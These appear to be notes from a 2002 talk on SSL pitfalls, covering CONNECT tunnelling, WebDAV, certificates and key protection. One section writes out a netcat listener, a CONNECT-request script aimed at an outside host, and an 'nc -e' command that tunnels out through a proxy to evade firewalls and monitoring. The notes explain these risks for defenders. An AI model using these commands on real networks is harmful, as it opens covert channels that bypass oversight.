Abstract





The meeting

Held at the AFP place
16 July 2002, 2pm to 3pm



Secure Sockets Layer: Pitfalls and Risks

Steven McLeod
Dr Michael Cohen

Main issue is the trust mechanism
 - Normal port is 443

SSL was designed to solve two problems
 - intercept of data
 - proof of identity of the communicating parties

Threats
 - SSL is encrypted
 - Man in the middle should not be able to view traffic
  - Therefore no: firewalling, ids, virus scan, auditing

Normally
 - Client requests connect to server (CONNECT ... HTTP/1.1)
 - Firewall builds a tunnel
 - Client and server talk 

Dangerous
 - Run on outside machine: nc -l -p 443

#!/bin/bash
echo -e "CONNECT outside.machine.foo.com:443 HTTP/1.0\r\n\r\n"
 /dev/null

 - On inside machine: nc -e scriptfile.sh proxyhost 8080

 - There are windows apps to do this too (HTTPort)

WebDav
 - Web Distributed Authoring and Versioning
 - File management over HTTP
 - Upload arbitary files
 - Download arbitary files

 - Well supported on Windows especially
 - Most good web servers support it

Certificates
 - A digital statement collating a number of fields
 - Company name, server name, email address, public key
 - Signed by the certifying authority

Therefore
 - CA needs to perform identity checks
 - Cert can't be changed
 - Anyone can verify certificate
 - The decision of trust in a browser is made about whether the browser trusts the CA

Securing the server's private key
 - Apache uses a pass phrase to encrypt the private key
 - IIS doesn't bother!

Attacks
 - Man in the middle -- certificate stops this
